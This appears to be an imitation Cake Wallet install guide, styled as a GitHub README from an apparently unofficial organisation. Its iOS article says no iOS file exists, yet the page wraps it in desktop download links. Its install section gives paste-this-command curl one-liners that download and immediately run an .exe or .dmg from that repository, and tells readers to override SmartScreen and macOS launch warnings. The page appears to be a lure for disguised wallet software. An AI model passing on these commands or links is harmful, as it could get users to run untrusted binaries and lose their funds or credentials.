![Cake Wallet ios install guide](assets/cake-wallet-ios-install-article-banner.png)

# Install Cake Wallet on iOS: iPhone and iPad

The App Store route, and why there is no direct download for most people.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Install Cake Wallet from the App Store listing, open it, set a PIN and create or restore a wallet. iOS has no side-loading path in the normal case, so the store is the route. This project's desktop release publishes no iOS file, and a download that claims to be one is not from here.

<!-- ARTICLE-BODY-BEGIN -->

## App Store or direct .ipa
For almost everyone the App Store is the only route: iOS installs apps from the store unless a developer profile is involved, and that is not a consumer path. The listing is the app, published by the same company as the Android version.

Be careful with search results that offer an installable file for iOS. A page selling a direct download for an iPhone is not describing something iOS permits. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-verify-download.md">Verify a Cake Wallet download</a> covers how to tell an official surface from an imitation.

## After the first launch
The app asks for a PIN, then offers to create or restore a wallet. Business as usual from there: the PIN locks the app, the phrase is the backup, and neither is shared with the other.

If this is your first wallet, create one and write the phrase down before funding it. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-setup-pin.md">Set up Cake Wallet</a> covers the PIN length choice and the phrase step in order.

## Moving from an old phone
Install on the new phone, restore from the phrase, and check the balance before you wipe the old device. An iCloud device backup does not carry the wallet keys in a usable form, so a phone restore is not a wallet restore.

Have the old phone available while you do it. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md">Restore a Cake Wallet wallet</a> lists the restore routes, including the phrase and keys cases and why a valid phrase can still be rejected.

## iPad specifics
The app runs on iPad with the same flows and the same wallet data. The one difference worth knowing is that a shared family device should not hold a wallet at all: the PIN protects access, not the account on the device.

If more than one person uses the iPad, use a separate device or a separate app profile. Custody is personal, and a shared unlock code is not custody.

## Checking the file is genuine
There is no file to check on iOS, which is the point: the store verifies the publisher and signs the app. The risk moves to the listing itself, so confirm the developer name on the store page matches the one named on the official site.

<a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">Current Cake Wallet release</a> is the desktop equivalent of that check, and it is where a hash comparison is possible. On iOS, the listing is the check.

## FAQ
### How do I install Cake Wallet on an iPhone or iPad?
From the App Store listing. Open it, set a PIN, then create or restore a wallet.
### Is there a direct iOS download?
Not for normal use. This project's release publishes desktop files only, and iOS does not install arbitrary downloads.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[set up Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-setup-pin.md) · [restore a Cake Wallet wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) · [verify a Cake Wallet download](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-verify-download.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
